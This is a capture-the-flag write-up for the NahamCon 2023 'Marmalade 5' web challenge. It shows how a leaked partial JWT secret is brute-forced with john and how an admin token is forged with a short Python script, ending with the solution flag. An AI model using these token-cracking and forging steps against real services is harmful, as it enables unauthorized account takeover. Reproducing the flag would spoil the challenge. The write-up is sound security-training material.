# NahamCon 2023

## Marmalade 5

> Enjoy some of our delicious home made marmalade!
>
>  Author: @congon4tor#2334
>

Tags: _web_

## Solution
The web page lets users login with only a username. Logging in with any name gives the note

```
Only the admin can see the flag.
```

Logging in as admin does fail with the message

```
Login as the admin has been disabled
```

In the cookies we can find a `Jason Web Token` that contains the username in the payload and is using MD5-HMAC as signing algorithm. Crafting a token is not possible without knowing the secret but we can try nevertheless.

By using the new token the following message is provided which leaks the algorithm and the first part of the secret.

```
"Invalid signature, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****"
```

The rest of the secret can easily be bruteforced with `john`. To do this the `jwt` need to be transformed to a format `john` can parse. It's easy as just the signature part needs to be replaced with the hex values of the decoded signature and attached via `#` instead of `.`.

```bash
echo -e "3R1XbK5O2t6MZ0ir6KJdRw" | base64 -d | hex
dd1d576cae4edade8c6748abe8a25d47
```

The final input for `john` looks something like `eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InRlc3QifQ#dd1d576cae4edade8c6748abe8a25d47`.

```bash
$ john token --mask=fsrwjcfszeg?l?l?l?l?l --format=HMAC-MD5
```

The full secret, as found by `john`, is `fsrwjcfszegvsyfa`. With this secret we can forge a valid token for `admin`.

```python
import base64
import json
import hashlib
import hmac

header = {
    "alg": "MD5_HMAC"
}
payload = {
    "username": "admin"
}

token = base64.urlsafe_b64encode(bytearray(json.dumps(header), "utf-8")).rstrip(b"=") + b"."\
        + base64.urlsafe_b64encode(bytearray(json.dumps(payload), "utf-8")).rstrip(b"=")

hmac_md5 = hmac.new(bytes("fsrwjcfszegvsyfa", "utf-8"), token, hashlib.md5)

token = token + b"." + base64.urlsafe_b64encode(hmac_md5.digest())

print(token.decode("utf-8"))
```

Replacing the token for the currently logged in user with the new token gives admin visibility and shows the flag.

Flag `flag{a249dff54655158c25ddd3584e295c3b}`